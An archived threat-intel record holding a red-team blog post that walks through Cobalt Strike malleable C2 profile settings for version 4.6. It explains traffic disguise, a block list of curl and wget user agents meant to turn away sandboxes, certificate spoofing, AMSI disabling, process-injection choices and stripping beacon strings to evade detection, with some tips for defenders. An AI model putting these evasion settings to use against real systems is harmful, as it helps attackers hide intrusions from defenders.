{
    "id": "ded55efd-d40c-4a37-8e89-bd8c5626a53c",
    "created_at": "2023-01-12T15:07:44.458629Z",
    "updated_at": "2025-03-27T02:16:26.326119Z",
    "deleted_at": null,
    "sha1_hash": "fed1125d2c4c543b6809917104d8156c0a8af42b",
    "title": "2022-04-21 - Understanding Cobalt Strike Profiles - Updated For Cobalt Strike 4.6",
    "authors": "",
    "file_creation_date": "2022-05-28T01:31:51Z",
    "file_modification_date": "2022-05-28T01:31:51Z",
    "file_size": 653765,
    "plain_text": "# Understanding Cobalt Strike Profiles - Updated for Cobalt Strike 4.6\n\n**blog.zsec.uk/cobalt-strike-profiles/**\n\nAndy Gill April 13, 2022\n\nI aim to keep this blog post updated as the new versions of Cobalt Strike come out and\nexplain the different options available within Malleable Profiles.\n\nI really enjoy the process of red teaming especially when it comes to evading detection and\nlining up against a good blue team. Probably one of the most common commercially\navailable Command and Control(C2) frameworks used today is Cobalt Strike(CS). So\n\n\n-----\n\npopular in fact it is classified on its own as a malware family by many defensive security\nproducts.\n\nUsing CS in red team operations is common practice for a lot of companies offering red\nteaming to their clients and my mileage is no different there. Having used many products I've\nfound the ability to craft how the C2 responds to traffic very useful, which is where malleable\nc2 profiles enter the conversation.\n\nOne of the great and popular features of cobalt strike is the ability to create profiles to shape\nand mask traffic, essentially a profile is used to tell the CS teamserver how traffic is going to\nlook and how to respond to the data the beacon sends it.\n\n## Example Profile\n\nThe output below is an example profile broken down into the different sections and much like\nthe documentation explains, I am going to break down what each section does and how it\nworks both from a profile specific perspective and in use case scenarios.\n\nIn addition I will explain what different sections can be used for to help blue team and purple\nteam folks alike understand how it works and how to develop detections.\n\n### Auxiliary Information\n\n\n-----\n\n```\nset sample_name Zsec Example Profile ;\nset host_stage \"false\"; \nset jitter \"0\";\nset pipename \"msagent_###\"; # Each # is replaced witha random hex value.\nset pipename_stager \"status_##\";\nset sleeptime \"60000\"; # default sleep in ms, 1 minute\nset ssh_banner \"Cobalt Strike 4.4\";\nset ssh_pipename \"postex_ssh_####\";\nset data_jitter \"100\"; \nset useragent \"Not Cobalt Strike\";\n\n```\nThe initial section is where the auxiliary information is set such as sleep times, user agent,\nnamed pipes and banners. The different options above are broken down as follows:\n\nsample_name: This is the name of the profile, it enables for easy management of\nmultiple profiles. This information is also used in the reporting output from CS within the\nindicators of compromise report.\nhost_stage: This value sets if the server will have a stager or not, the common practice\nfor opersational security is to set this to false and use stageless payloads with the\ntradeoff that shellcode produced is much bigger due to it containing everything.\njitter: This is the percetage of jitter on the sleep time of the beacon, it defaults to 0 but\ncan be set to any %. Meaning if for example 10% is set and the sleep time was 60s the\nbeacon sleep would be anything from 54-66s of sleep.\npipeame: This sets the default name used for any named pipes, typically when writing\nprofiles it is best practice to enumerate pipes of software in the environment and tweak\nthe profile to match. A common example is to mirror Google Chrome named pipes\nwhich start `mojo_ . Named pipe beacons are typically used over the SMB protocol`\nand for hosts that cannot communicate directly to the internet, rather communicate\nback to a primary beacon that has a direct outbound connection.\nsleeptime: This is the check in time or sleep timer of the beacon in miliseconds, the\ndefault is typically 60000 aka a minute, but this can be set to anything and combined\nwith the jitter option to solidify a stealthy breach. Blue/Purple tip, it is possible to work\nout the time deltas on beacons if a process is checking back to a certain domain or list\nof domains over a period of time, there are various tools that will extract information\nabout the beacon from the running processes.\nssh_banner: This sets the banner shown on SSH beacons, typically for opsec this\nshould be set to a Linux banner such as `OpenSSH_7.4 Debian (protocol 2.0) or a`\nservice to match the traffic being sent.\nssh_pipename: Similar to the pipename parameter, this is the name of the pipe used\nfor SSH based beacons.\ndata_jitter: This will enable the operator to append a random length of null data up to\nthe amount set to both get and post responses from the CS server.\n\n\n-----\n\nuseragent: This sets the User-Agent string used in HTTP requests by the beacon in CS\nversions < 4.2 there is a 128 max characters limit whereas in CS 4.2+ the max is\nincreased to 255 characters. Typically this value will be set to a user browser or if the\nprofile is set to match a specific piece of software it might mirror that software user\nagent.\n\n### HTTP Config\n\nIn addition to the auxiliary information at the top of the profile, the http-config section\nspecifies additional aux information related to specifics applicable to all aspects of the profile.\nSuch as headers to be sent in requests, whether X-Forwarded-For is to be trusted or not and\nif specific user agents are to be blocked or allowed. The http-config block has influence over\nall HTTP responses served by Cobalt Strike’s web server.\n```\nhttp-config {\n  set headers \"Date, Server, Content-Length, Keep-Alive, Connection, Content-Type\";\n  header \"Server\" \"Apache\";\n  header \"Keep-Alive\" \"timeout=10, max=100\";\n  header \"Connection\" \"Keep-Alive\";\n  set trust_x_forwarded_for \"true\";\n  set block_useragents \"curl*,lynx*,wget*\";\n  set allow_useragents \"*Mozilla*\";\n}\n\n```\nset headers - Does what it says on the tin, specifies specific headers to be set\nthroughout the profile and interactions with beacon and server.\ntrust_x_forwarded_for - Use this option if your teamserver is behind a redirector, which\nfrom an opsec perspective should ALWAYS be the case if using as an external C2!\nblock_useragents - This acts as a block list of user agents that will be met with a 404\npage, when browsing to the redirector and passing through to the C2. This can be\nuseful for blocking known crawlers and sandboxes ;).\nallow_useragents - The inverse of the above option, this can be used as an allow list\nfor specific user agents to be permitted to connect to the C2 server.\n\n### TLS Certificate\n\n\n-----\n\nWhen using a HTTPS listener, CS gives the option for using signed HTTPS certificates for\nC2 communications. There are multiple options when setting this up ranging from none to\nsigned by trusted authority all of which are described below:\n```\nhttps-certificate {\n     # Option 1: Create a signed certificate with Java Keystore tool\n     set keystore \"/pathtokeystore\";\n  set password \"password\";\n  # Option 2: Self Signed with vendor specifics\n  set C  \"US\";\n  set CN \"jquery.com\";\n  set O  \"jQuery\";\n  set OU \"Certificate Authority\";\n  set validity \"365\";\n}\n\n```\n[HTTPSC2DoneRight will enable you to create a signed TLS certificate that can be used with](https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh)\nCS to improve legitmacy.\n\nOption 1 above shows a method for making a signed certificate and creating a Java\nKeystore file and a password for the keystore. This keystore must contain your\ncertificate's private key, the root certificate, any intermediate certificates, and the\ndomain certificate provided by your SSL certificate vendor. CS expects to find the Java\nKeystore file in the same folder as your Malleable C2 profile.\nOption 2: Is to create a self-signed certificate with whatever information you want,\ntypically this is done to spoof an existing certificate to match the profile, the C, CN, I,\nOU and validity are all set from typical information supplied in a TLS certificate.\n\n### Client and Server Interactions\n\nThe most customisable aspect of the profile is being able to specify which sections act in\ndifferent ways, the main ones are GET and POST specifying how traffic is intercepted and\nhow data is chunked. An example GET and POST section are shown below complete with\n\n\n-----\n\nboth client and server interactions.\n```\nhttp-get {\n  set uri \"/web /api/gallery /updates /about\";\n  client {\n    header \"Accept\" \"*/*\";\n    header \"Connection\" \"Close\";\n    header \"Host\" \"zsec.uk\";\n    metadata {\n      base64;\n      netbios;\n      prepend \"cf=\";\n      header \"Cookie\";\n    }\n  }\n  server {\n    output {\n      print;\n    }\n  }\n}\n\n```\nThe main sections of the profile are broken up into uri, client, server and the contents held\nwithin each. Breaking the above section down:\n\nset uri: Specifies the URI that the beacon will call back to, this is chosen at random\nfrom the list at the time of generation of the beacon, initially one would assume these\nare round robin but unforunately not. Each beacon variant will have one URI hard\ncoded for both post and get, which is good news for defenders attempting to identify\ntraffic in netflow data.\nThe client section details the information sent and shown by the beacon on the target\nhost, this dictates how traffic is chunked and sent and it also specifies how information\nis encoded, there are multiple options available for this. In addition the profile enables\nyou to set specific headers which is especially important if a specific site or endpoint is\nbeing emulated as this will show in the HTTP traffic. It also specifies what the expected\nhost header is on traffic, this enables differentiating between false HTTP traffic and\nlegitimate C2 traffic.\n\n\n-----\n\nThe metadata section specifiies where things such as cookies can be set, this is an\nadditional place where data can be hidden on C2 communications, typically data is\nsent in either a specific header or a cookie value which can be specified and set to\nanything. When red teaming a client it is often common practice to profile users'\nbrowsers and expected traffic in an environment to enable better blending in. When\nCS's Beacon \"phones home\" it sends metadata about itself to the CS teamserver.\nThe server section details how the server responds to C2 traffic, the example above\ntells the server to respond with raw data in its encrypted form however this can be\ncustomised in the same way as the client specifying key areas where things should be\nencoded.\n\nThere are a few options available when it comes to data encoding and transformation. For\nexample, you may choose to netbios encode the data to transmit, prepend some information,\nand then base64 encode the whole package.\n\nbase64 - Base64 encode data that is encapsulated in various sections, in the exable\nabove the cookie value `cf_ contains encoded metadata to be sent back to the CS`\nserver.\nbase64url - URL-safe Base64 Encode, this is typically used when sending data back in\na URL parameter and the data needs to be URL safe so as to not break the\ncommuncation stream.\nmask - XOR mask w/ random key, this encodes and encrypts the data within a XOR\nstream with a random key, typically used in combination with other encoding to\nobfuscate the data stream.\nnetbios - NetBIOS Encode 'a' it encodes as netbios data in lower case.\nnetbiosu - NetBIOS Encode 'A', another form of netbios encoding.\n\n\n-----\n\n**POST Section**\n```\nhttp-post {\n  set uri \"/web/auth.php /admin/login.php\";\n  client {\n    header \"Accept\" \"*/*\";\n    header \"Host\" \"zsec.uk\";\n    header \"Connection\" \"Close\";\n    id {\n      netbios;\n      base64url;\n      parameter \"key\";\n    }\n    output {\n      print;\n    }\n  }\n  server {\n    header \"Pragma\" \"no-cache\";\n    header \"Connection\" \"close\";\n    output {\n      print;\n    }\n  }\n}\n\n```\nAgain like the GET section above, the POST section states how information should be sent\nin a POST request, it has the added benefit that specifics such as body content and other\nparameters can be set to enable you to blend in.\n\n### Post Exploitation\n\nCustomising the GET and POST requests is just the beginning, the next few sections of the\nprofile is where the magic of post exploitation customisation lives including how the beacon\nlooks in memory, how migration and beacon object files affect the indicators of compromise\nand much much more.\n\n\n-----\n\n```\npost ex {\n  set spawnto_x86 \"%windir%\\\\syswow64\\\\dllhost.exe\";\n  set spawnto_x64 \"%windir%\\\\sysnative\\\\dllhost.exe\";\n  set obfuscate \"true\";\n  set smartinject \"true\";\n  set amsi_disable \"true\";\n  set pipename \"Winsock2\\\\CatalogChangeListener-###-0,\";\n  set keylogger \"GetAsyncKeyState\";\n  set threadhint \"module!function+0x##\"\n}\n\n```\nspawnto_x86|spawnto_x64 - Specifies the process that will be hollowed out and new\nbeacon process be created inside, this can typically be set to anything however it is\nrecommended not to use the following\n\"csrss.exe\",\"logoff.exe\",\"rdpinit.exe\",\"bootim.exe\",\"smss.exe\",\"userinit.exe\",\"sppsvc.exe\".\nIn addition selecting a binary that does not launch with user account control is\nkey(UAC). To add additional stealthy and blending techniques, you can add paramters\nto the spawnto command: `set spawnto_x86 \" %windir%\\syswow64\\dllhost.exe -`\n```\n   k netsvcs\"; .\n\n```\nobfuscate - The obfuscate option scrambles the content of the post-exploitation DLLs\nand settles the post-ex capability into memory in a more operational security-safe\nmanner.\nsmartinject - This directs Beacon to embed key function pointers, like GetProcAddress\nand LoadLibrary, into its same-architecture post-ex DLLs. This allows post-ex DLLs to\nbootstrap themselves in a new process without shellcode-like behavior that is detected\nand mitigated by watching memory accesses to the PEB and kernel32.dll.\namsi_disable - This option directs powerpick, execute-assembly, and psinject to patch\nthe AmsiScanBuffer function before loading .NET or PowerShell code. This limits the\nAntimalware Scan Interface visibility into these capabilities. There are additional things\nthat can be done post exploitation with the likes of beacon object files(BOFS) to evade\namsi, but I will not be covering BOFs in this post.\nkeylogger - The GetAsyncKeyState option (default) uses the GetAsyncKeyState API to\nobserve keystrokes. The SetWindowsHookEx option uses SetWindowsHookEx to\nobserve keystrokes, this can be tuned even more within the TeamServer properties\nwhich is discussed further down this post.\nThreadhint - allows multi-threaded post-ex DLLs to spawn threads with a spoofed start\naddress. Specify the thread hint as \"module!function+0x##\" to specify the start address\nto spoof. The optional 0x## part is an offset added to the start address.\n\nAdditionally as set in the auxiliary information, the named pipe can be configured for\nspawning off of new processes under `pipename .`\n\n**Moar Customisation**\n\n\n-----\n\nNow post exploitation is cool and all but how about tuning the ways in which process\ninjection and memory indicators behave? Starting with process injection this is defined with\nthe `process-inject { header:`\n```\nprocess-inject {\n  set allocator \"NtMapViewOfSection\";\n  set min_alloc \"17500\";\n  set startrwx \"false\";\n  set userwx  \"false\";\n  transform-x86 {\n    prepend \"\\x90\\x90\";\n    #append \"\\x90\\x90\";\n  }\n  transform-x64 {\n    prepend \"\\x90\\x90\";\n    #append \"\\x90\\x90\";\n  }\n   execute {\n    CreateThread \"ntdll!RtlUserThreadStart+0x42\";\n    CreateThread;\n    NtQueueApcThread-s;\n    CreateRemoteThread;\n    RtlCreateUserThread; \n  }\n}\n\n```\nThe various sections are defined as follows:\n\nset allocator - Allows setting a remote memory allocation using one of two techniques:\nVirtualAllocEx or NtMapViewOfSection\nmin_alloc - Minimium memory allocation size when injecting content, very useful when\nit comes to being specific.\nstartrwx|userwx - This defaults to false as it sets the memory permissions as initial=\nread write execute, final= read and execute.\ntransform-x86| transform-x64 - Transform injected content to avoid signature detection\nof first few bytes. Only supports prepend and append of hex based bytes.\n\nThe execute section controls the methods that the Beacon will use when it needs to inject\ncode into a process. Beacon examines each option in the execute block, determines if the\noption is usable for the current context, tries the method when it is usable, and moves on to\nthe next option if code execution did not happen.\n\n\n-----\n\nCreateThread - current process only aka self injection\nCreateRemoteThread - Vanilla cross process injection technique. Doesn't cross\nsession boundaries\nNtQueueApcThread|NtQueAPCThread-s - This is the \"Early Bird\"injection technique.\nSuspended processes (e.g., post-ex jobs) only.\nRtlCreateUserThread- Risky on XP-era targets;uses RWX shellcode for x86->x64\ninjection.\nSetThreadContext - Suspended processes (e.g. post-ex jobs only)\n\n**Memory Indicators**\n\nFinally this block in Malleable C2 profiles controls how Beacon is loaded into memory and\nedit the contents of the Beacon Reflective DLL. There are a large amount of options to\ncustomise this and as a result the possibilities of how a beacon looks in memory are endless!\n```\nstage {\n  set userwx     \"false\";\n  set stomppe     \"true\";\n  set obfuscate    \"true\";\n  set name      \"srv.dll\";\n  set cleanup     \"true\";\n  # Values captured using peclone against a Windows 10 version of explorer.exe\n  set checksum    \"0\";\n  set compile_time  \"11 Nov 2016 04:08:32\";\n  set entry_point   \"650688\";\n     set image_size_x86 \"4661248\";\n     set image_size_x64 \"4661248\";\n     set rich_header  \n\"\\x3e\\x98\\xfe\\x75\\x7a\\xf9\\x90\\x26\\x7a\\xf9\\x90\\x26\\x7a\\xf9\\x90\\x26\\x73\\x81\\x03\\x26\\xfc\\\n  # transform the x64 rDLL stage\n  transform-x64 {\n    strrep  \"This program cannot be run in DOS mode\" \"\";\n    strrep  \"beacon.dll\" \"\";\n    strrep  \"beacon.x64.dll\" \"\";\n    strrep  \"beacon.x32.dll\" \"\";\n  }\n    # transform the x86 rDLL stage\n  transform-x86 {\n    strrep  \"ReflectiveLoader\" \"run\";          \n    strrep  \"This program cannot be run in DOS mode\" \"\";\n    strrep  \"beacon.dll\" \"\";\n    strrep  \"beacon.x64.dll\" \"\";\n    strrep  \"beacon.x32.dll\" \"\";\n  }\n\n```\nstomppe - Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads\nBeacon payload\n\n\n-----\n\nname - The Exported name of the Beacon DLL\ncleanup  - Ask Beacon to attempt to free memory associated with the Reflective DLL\npackage that initialized it.\nchecksum - This defaults to zero however it is the CheckSum value in Beacon's PE\nheader.\ncompile_time  - sets the time that the PE was compiled, note all of the information can\nbe cloned from a legitmate binary using the peclone tool built into cobalt strike.\nentry_point  - The EntryPoint value in Beacon's PE header\nimage_size_x86 | image_size_x64 - SizeOfImage value in Beacon's PE header\nrich_header - Meta-information inserted by the compiler\ntransform-x86 | transform-x64 - The transform-x86 and transform-x64 blocks pad and\ntransform Beacon's Reflective DLL stage. These blocks support three commands:\nprepend, append, and strrep.\n\n### Profile Variants\n\nBy default a profile only contains one block of GET and POST however it is possible to pack\nvariations of the current profile by specifying variant blocks. An example variant is shown\nbelow:\n```\nhttp-get \"GET Azure\" {\n     client {\n          parameter \"api\" \"AZ_example\";\n    header \"Cookie\" \"SomeValue\";\n     }\n\n```\nEach variant can have a different name which is later specified when specifying the listener,\nthe screenshot below explains how a listener is defined(borrowed from\n[https://blog.cobaltstrike.com/2019/12/05/cobalt-strike-4-0-bring-your-own-weaponization/).](https://blog.cobaltstrike.com/2019/12/05/cobalt-strike-4-0-bring-your-own-weaponization/)\n\n\n-----\n\nVariants are selectable when configuring an HTTP or HTTPS Beacon listener. Variants allow\neach HTTP or HTTPS Beacon listener tied to a single team server to have network IOCs that\ndiffer from each other.\n\n## Difference between GET-ONLY and normal Profiles\n\nI came across the difference recently when it comes to GET vs POST profiles, there are a\nfew blog posts that covered it but skipped over this part and it left me scratching my head on\nquite a few occasions. Essentially it is in the name, a GET only profile, funnily enough only\nuses GET requests to communicate with the server.\n\n\n-----\n\nIn terms of malleable c2 profile for GET-only the options that differ from a standard profile is\nthat the HTTP Verb in the http-post section needs to be set to `set verb \"GET\" as shown`\nbelow. However the output also needs to be set to `base64url and given a parameter to be`\nsent in the URL. There are a few limitations of doing this as unless you are using a\nshortened URL/URI for your callback host, you are limited to 2,083 characters in a URL\nwhich minus the URL gives us on average 2000 chars to play with on each request.\n\n\n-----\n\n```\nhttp post {\n  set uri \"/Search/\";\n  set verb \"GET\"; # Option required for GET-Only\n  client {\n    output {\n      base64url; # Option required for GET-Only\n      parameter \"q\";\n    }\n    id {\n      base64url; # Option required for GET-Only\n      parameter \"form\";\n    }\n  }\n  server {\n    header \"Cache-Control\" \"private, max-age=0\";\n    header \"Content-Type\" \"text/html; charset=utf-8\";\n    header \"Vary\" \"Accept-Encoding\";\n    header \"Server\" \"Microsoft-IIS/8.5\";\n    header \"Connection\" \"close\";\n    output {\n      netbios;\n      print;\n    }\n  }\n}\n\n```\nThe HTTP-POST section serves as the beacon’s response to commands issued by the\nserver and can actually be performed as a HTTP GET or HTTP POST request. In this case\nfor a get-only profile the http verb is set to `GET .`\n\n## New Features in Cobalt Strike 4.4 & 4.5\n\nWith all tooling things get updated, so the features below were introduced in CS 4.4 which\nboth improve the profile and operating experience for operators. A few of the newer features\nthat introduce additional options in the CS profile are:\n\nSleep Mask Kit - Since CS 3.x there has been an option within memory indicators to\nenable tuning of the sleep mask however with the sleep mask kit it is possible to\nconfigure this one step more.\n```\n   .http-config.allow_useragents - Within the HTTP-Config area it is possible to set\n\n```\nblocked user agents, however in 4.4 the option to specifiy only allowed user agents\nbecame an option.\n\n\n-----\n\nTeamserver Properties file - Described below.\n\n### Teamserver Properties File (TeamServer.prop)\n\nI noticed this error when hooking up my CS4.4 team server:\n```\n[!] Properties file (/home/ubuntu/cobaltstrike/TeamServer.prop) was not\nfound.\n\n```\nThe file contains several optional parameters that can be used to further customise the\nsettings used by the team server to validate screenshot and keylog callback data. It also\nenables tweaking of other options like the fix for the “HotCobalt” vulnerability. An example\nteamserver properties file is shown below:\n```\n#Cobalt Strike Team Server Properties\n#Fri May 07 12:00:00 CDT 2021\n# -----------------------------------------------# Validation for screenshot messages from beacons\n# -----------------------------------------------# limits.screenshot_validated=true\n# limits.screenshot_data_maxlen=4194304\n# limits.screenshot_user_maxlen=1024\n# limits.screenshot_title_maxlen=1024\n# Stop writing screenshot data when Disk Usage reaches XX%\n# Example: Off\n#     \"limits.screenshot_diskused_percent=0\"\n# Example: Stop writing screenshot data when Disk Usage reaches 95%\n#     \"limits.screenshot_diskused_percent=95\"\n# Default:\n# limits.screenshot_diskused_percent=95\n# -----------------------------------------------# Validation for keystroke messages from beacons\n# -----------------------------------------------# limits.keystrokes_validated=true\n# limits.keystrokes_data_maxlen=8192\n# limits.keystrokes_user_maxlen=1024\n# limits.keystrokes_title_maxlen=1024\n# Stop writing keystroke data when Disk Usage reaches XX%\n# Example: Off\n#     \"limits.keystrokes_diskused_percent=0\"\n# Example: Stop writing keystroke data when Disk Usage reaches 95%\n#     \"limits.keystrokes_diskused_percent=95\"\n# Default:\n# limits.keystrokes_diskused_percent=95\n\n```\nFrom the cobalt strike site the properties file is described as:\n\nLines starting with “#” are comments.\n```\n   limits._data_maxlen is the maximum size of screenshot/keylog data that will be\n\n```\nprocessed. Callbacks exceeding this limit will be rejected.\n\n\n-----\n\n```\n   limits._validated=false means that the three following …_maxlen settings are\n\n```\nignored\nSetting any of the “…_maxlen” settings to zero will disable that particular setting\n```\n   limits._diskused_percent sets the threshold for callback processing. Callbacks\n\n```\n_are rejected when disk usage exceeds the specified percentage_\n```\n   limits._diskused_percent=0 (zero) disables this setting\n\n```\nValid values are 0-99\n\nThanks to [Joe Vest for updates regarding CS 4.5 taken from git:](https://github.com/threatexpress/malleable-c2)\n\n## Cobalt Strike 4.5 Updates and Considerations\n\n### Sleepmask and UDRL Updates\n\nThe sleepmask and UDRL(User Defined Reflective Loader) hooks were updated in version\n4.5. If you use a custom UDRL and a custom sleepmask, there could be conflicts with profile\nsettings if `sleepmask = true`\n\n**stage.userwx**\n\nThis setting is a Boolean and informs the default loader to either use RWX or RX memory. At\nruntime beacon will either include or not include the .text section for masking. If the setting is\nset to TRUE, your user defined loader needs to set the protection on the .text section as\nRWX otherwise beacon will crash. If the setting is set to FALSE, your user defined loader\nshould set the protection on the .text section as RX as the .text section will not be masked.\n\n**stage.obfuscate**\n\nThis setting is a Boolean and informs the default loader to either copy the header or not copy\nthe header into memory. At runtime beacon will either include or not include the header\nsection for masking. If the setting is set to TRUE, your user defined reflective loader should\nnot copy the header into memory as beacon will not mask the header section. If the setting is\nset to FALSE, your user defined loader should copy the header into memory as beacon will\nmask the header section.\n\nDepending on how sophisticated your reflective loader is you will need to make sure the\nsettings in the Malleable C2 profile will work with how the beacon payload is loaded into\nmemory. With the BEACON_RDLL_GENERATE and BEACON_RDLL_GENERATE_LOCAL\naggressor script hooks you do have the opportunity to modify your reflective loader by using\nthe aggressor script pe_* functions.\n\n## 4.6 Updates and Considerations\n\n\n-----\n\nThree new options were added that provide control to how much data (tasks and proxy) is\ntransferred through a communication channel\n```\nset tasks_max_size \"1048576\";\nset tasks_proxy_max_size \"921600\";\nset tasks_dns_proxy_max_size \"71680\"; \n\n```\n**set tasks_max_size**\n4.6 adds three new options, the first of which is tasks_max_size which sets the maximum\nsize (in bytes) of task(s) and proxy data that can be transferred through a communication\nchannel at a check in of a beacon.\n\n**set tasks_proxy_max_size**\ntasks_proxy_max_size sets the maximum size (in bytes) of proxy data to transfer via the\ncommunication channel at check in, this in conjunction with the other two options gets\naround the 1mb limit previously encountered within CS.\n\n**set tasks_dns_proxy_max_size**\ntasks_proxy_max_size sets maximum size (in bytes) of proxy data to transfer via the DNS\ncommunication channel at a check-in of a beacon.\n\nThe `tasks_max_size,` `tasks_proxy_max_size, and` `tasks_dns_proxy_max_size work`\nin conjunction to create a data buffer to be transferred to beacon when a check-in occurs.\nThis is to ensure that when a beacon checks in it requests a list of tasks and proxy data that\nare ready to be transferred to the beacon and any associated child processes or beacons.\nThe data buffer starts to fill with task(s) followed by proxy data for the parent beacon. Then it\ncontinues this pattern for each child beacon until no more tasks or proxy data is available or\nthe tasks_max_size setting will be exceeded by the next task or proxy data.\n\nhttps://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/to\npics/malleable-c2_profile-language.htm#_Toc65482837\n\n## Conclusion\n\nHopefully this post has given you a deeper understanding of some of the nuances around\nCS profile creation and some of the areas to explore some more. It has not been a complete\nguide as I didn't want to re-write the already great malleable C2 documentation. However it\ngives a bit of guidance around areas that should be noted and some of the key differences\nbetween sections and areas that matter.\n\nThis post is also now featured in https://github.com/threatexpress/malleablec2/blob/master/MalleableExplained.md\n\n[Previous Post](https://blog.zsec.uk/chasing-the-silver-petit-potam/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-21 - Understanding Cobalt Strike Profiles - Updated For Cobalt Strike 4.6.pdf"
    ],
    "report_names": [
        "2022-04-21 - Understanding Cobalt Strike Profiles - Updated For Cobalt Strike 4.6.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536064,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653701511,
    "ts_modification_date": 1653701511,
    "files": {
        "pdf": "https://archive.orkl.eu/fed1125d2c4c543b6809917104d8156c0a8af42b.pdf",
        "text": "https://archive.orkl.eu/fed1125d2c4c543b6809917104d8156c0a8af42b.txt",
        "img": "https://archive.orkl.eu/fed1125d2c4c543b6809917104d8156c0a8af42b.jpg"
    }
}